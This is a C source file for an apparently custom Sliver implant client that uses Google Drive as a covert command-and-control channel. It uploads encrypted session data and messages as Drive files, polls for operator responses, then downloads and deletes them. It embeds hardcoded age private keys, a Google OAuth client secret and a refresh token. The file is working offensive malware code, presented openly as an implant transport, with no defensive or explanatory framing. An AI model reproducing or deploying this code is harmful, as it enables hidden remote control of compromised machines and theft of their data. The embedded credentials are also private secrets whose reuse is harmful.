#include "pch.h"

BOOL RefreshAccessToken
(
	PDRIVE_CONFIG pDriveConfig
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token";
	CHAR lpBody[0x400];
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pHttpResp = NULL;
	BOOL Result = FALSE;
	LPSTR lpResult = NULL;
	LPSTR lpContentTypeStr = NULL;

	pHttpClient = HttpClientInit(UriInit(szOauthPath), pDriveConfig->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(lpBody, sizeof(lpBody));
	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
	pHttpResp = SendHttpRequest(&pDriveConfig->HttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
	if (pHttpResp == NULL) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pHttpResp->pRespData, "access_token\": \"", "\",\n");
	if (lpResult == NULL) {
		goto CLEANUP;
	}

	pDriveConfig->HttpConfig.lpAccessToken = lpResult;
	Result = TRUE;
CLEANUP:
	FreeHttpResp(pHttpResp);
	FreeHttpClient(pHttpClient);
	if (lpContentTypeStr != NULL) {
		FREE(lpContentTypeStr);
	}

	return Result;
}

PDRIVE_CONFIG GoogleDriveInit
(
	_In_ LPSTR lpUserAgent,
	_In_ LPSTR lpClientId,
	_In_ LPSTR lpSecret,
	_In_ LPSTR lpRefreshToken
)
{
	LPSTR lpProxy = NULL;
	PDRIVE_CONFIG lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	lpProxy = GetProxyConfig();
	lpResult = ALLOC(sizeof(DRIVE_CONFIG));
	lpResult->lpClientId = lpClientId;
	lpResult->HttpConfig.lpUserAgent = lpUserAgent;
	lpResult->lpClientSecret = lpSecret;
	lpResult->lpRefreshToken = lpRefreshToken;
	lpResult->HttpConfig.dwNumberOfAttemps = 10;
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			lpResult->HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			lpResult->HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}

		FREE(lpProxy);
	}

	return lpResult;
}

BOOL DriveUpload
(
	_In_ PDRIVE_CONFIG This,
	_In_ PBYTE pData,
	_In_ DWORD cbData,
	_In_ LPSTR lpName
)
{
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	SYSTEMTIME SystemTime;
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;

	lpBody = ALLOC(cbData + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, cbData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LogError(L"VirtualAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}
	}

	ZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
	GetSystemTime(&SystemTime);
	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
	memcpy(&lpBody[cbBody], pData, cbData);
	cbBody += cbData;
	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, This->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(&This->HttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		LogError(L"dwStatusCode != HTTP_STATUS_OK at %lls\n", __FUNCTIONW__);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	return Result;
}

BOOL GetFileId
(
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR lpPattern,
	_Out_ LPSTR* pId
)
{
	CHAR szUri[0x400] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20contains%20%27";
	DWORD cbResp = 0;
	BOOL bResult = FALSE;
	LPSTR lpResult = NULL;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	RefreshAccessToken(pDriveConfig);
	wsprintfA(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,name)", lpPattern);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, pDriveConfig->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pResp->pRespData, "\"id\": \"", "\",\n");
	if (lpResult != NULL) {
		*pId = lpResult;
	}

	bResult = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return bResult;
}

BOOL DriveDelete
(
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR lpFileId
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	BOOL Result = FALSE;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	RefreshAccessToken(pDriveConfig);
	wsprintfA(&szUri[lstrlenA(szUri)], "%s", lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, pDriveConfig->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return Result;
}

PBYTE DriveDownload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpFileId,
	_Out_ PDWORD pcbOutput
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PBYTE pResult = NULL;
	DWORD dwFileSize = 0;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	wsprintfA(&szUri[lstrlenA(szUri)], "%s?alt=media", lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, This->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(This, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pResult = ALLOC(pResp->cbResp + 1);
	memcpy(pResult, pResp->pRespData, pResp->cbResp);
	if (pcbOutput != NULL) {
		*pcbOutput = pResp->cbResp;
	}
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return pResult;
}

VOID FreeDriveConfig
(
	_In_ PDRIVE_CONFIG pDriveConfig
)
{
	DWORD i = 0;

	if (pDriveConfig != NULL) {
		if (pDriveConfig->lpClientId != NULL) {
			FREE(pDriveConfig->lpClientId);
		}

		if (pDriveConfig->lpClientSecret != NULL) {
			FREE(pDriveConfig->lpClientSecret);
		}

		if (pDriveConfig->lpRefreshToken != NULL) {
			FREE(pDriveConfig->lpRefreshToken);
		}

		if (pDriveConfig->HttpConfig.lpUserAgent != NULL) {
			FREE(pDriveConfig->HttpConfig.lpUserAgent);
		}

		if (pDriveConfig->HttpConfig.lpAccessToken != NULL) {
			FREE(pDriveConfig->HttpConfig.lpAccessToken);
		}

		for (i = 0; i < _countof(pDriveConfig->HttpConfig.AdditionalHeaders); i++) {
			if (pDriveConfig->HttpConfig.AdditionalHeaders[i] != NULL) {
				FREE(pDriveConfig->HttpConfig.AdditionalHeaders[i]);
			}
		}

		FREE(pDriveConfig);
	}
}

PSLIVER_DRIVE_CLIENT DriveClientInit()
{
	LPSTR lpProxy = NULL;
	PSLIVER_DRIVE_CLIENT pResult = NULL;
	BOOL IsOk = FALSE;
	LPSTR lpEncodedSessionKey = NULL;
	PBYTE pTemp = NULL;

	// Tu dinh config --------------------------------------------------------------------
	/*CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
	UINT64 uEncoderNonce = 51666;
	CHAR szSliverClientName[32] = "TALL_MEAT";*/

	// Laptop config ---------------------------------------------------------------------
	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	UINT64 uEncoderNonce = 6979;
	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
	DWORD dwPollInterval = 60 * 5;
	// END -------------------------------------------------------------------------------

	// Google Drive Config
	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	// END -------------------------------------------------------------------------------

	DWORD i = 0;

	pResult = ALLOC(sizeof(PSLIVER_DRIVE_CLIENT));
	lstrcpyA(pResult->szSliverName, szSliverClientName);
	pResult->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	pResult->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
	pResult->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
	pResult->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
	pResult->dwPollInterval = dwPollInterval;
	pTemp = GenRandomBytes(8);
	memcpy(&pResult->uPeerID, pTemp, 8);
	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
	IsOk = TRUE;
CLEANUP:
	if (pTemp != NULL) {
		FREE(pTemp);
	}

	if (lpProxy != NULL) {
		FREE(lpProxy);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (!IsOk && pResult != NULL) {
		FreeHttpClient(pResult);
	}

	return pResult;
}

BOOL DriveSendRequest
(
	_In_ PSLIVER_DRIVE_CLIENT pSliverClient,
	_In_ PBYTE pData,
	_In_ DWORD cbData
)
{
	CHAR szName[0x200];

	SecureZeroMemory(szName, sizeof(szName));
	sprintf(szName, "%s_%s_%lld.tex", pSliverClient->lpSendPrefix, pSliverClient->szSessionID, pSliverClient->uEncoderNonce);
	return DriveUpload(&pSliverClient->DriveConfig, pData, cbData, szName);
}

PSLIVER_DRIVE_CLIENT DriveSessionInit()
{
	DWORD cbResp = 0;
	PSLIVER_DRIVE_CLIENT pSliverClient = NULL;
	LPSTR lpEncodedSessionKey = NULL;
	BOOL IsOk = FALSE;
	PBYTE pDecodedResp = NULL;
	DWORD cbDecodedResp = 0;
	LPSTR lpSessionId = NULL;
	DWORD cbSessionId = 0;
	PBYTE pEncryptedSessionInit = NULL;
	LPSTR lpRespData = NULL;
	PBYTE pResp = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PBYTE pMarshalledData = NULL;
	LPWSTR lpTemp = NULL;
	CHAR szName[0x80];
	CHAR szPattern[0x80];
	LPSTR lpRespFileId = NULL;

	pSliverClient = DriveClientInit();
	if (pSliverClient == NULL) {
		goto CLEANUP;
	}

	pMarshalledData = ALLOC(CHACHA20_KEY_SIZE + 2);
	pMarshalledData[0] = 10;
	pMarshalledData[1] = CHACHA20_KEY_SIZE;
	memcpy(pMarshalledData + 2, pSliverClient->pSessionKey, CHACHA20_KEY_SIZE);
	pEncryptedSessionInit = AgeKeyExToServer(pSliverClient->lpRecipientPubKey, pSliverClient->lpPeerPrivKey, pSliverClient->lpPeerPubKey, pMarshalledData, CHACHA20_KEY_SIZE + 2, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
	SecureZeroMemory(szName, sizeof(szName));
	sprintf(szName, "%s.reg", pSliverClient->lpSendPrefix);
	DriveUpload(&pSliverClient->DriveConfig, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), szName);
	Sleep(pSliverClient->dwPollInterval * 3);

	SecureZeroMemory(szPattern, sizeof(lpRespFileId));
	sprintf(szPattern, "%s_", pSliverClient->lpRecvPrefix);
	if (!GetFileId(&pSliverClient->DriveConfig, szPattern, &lpRespFileId)) {
		goto CLEANUP;
	}

	pResp = DriveDownload(&pSliverClient->DriveConfig, lpRespFileId, &cbResp);
	DriveDelete(&pSliverClient->DriveConfig, lpRespFileId);
	lpRespData = ExtractSubStrA(pResp, cbResp);
	pDecodedResp = SliverBase64Decode(lpRespData, &cbDecodedResp);
	if (pDecodedResp == NULL || cbDecodedResp == 0) {
		goto CLEANUP;
	}

	lpSessionId = SessionDecrypt(pSliverClient, pDecodedResp, cbDecodedResp, &cbSessionId);
	if (lpSessionId == NULL || cbSessionId == 0) {
		goto CLEANUP;
	}

	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		FreeSliverHttpClient(pSliverClient);
		pSliverClient = NULL;
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	if (pResp != NULL) {
		FREE(pResp);
	}

	if (lpRespFileId != NULL) {
		FREE(lpRespFileId);
	}

	if (lpSessionId != NULL) {
		FREE(lpSessionId);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (pMarshalledData != NULL) {
		FREE(pMarshalledData);
	}

	if (pEncryptedSessionInit != NULL) {
		FREE(pEncryptedSessionInit);
	}

	if (pDecodedResp != NULL) {
		FREE(pDecodedResp);
	}

	FreeHttpResp(pResp);
	return pSliverClient;
}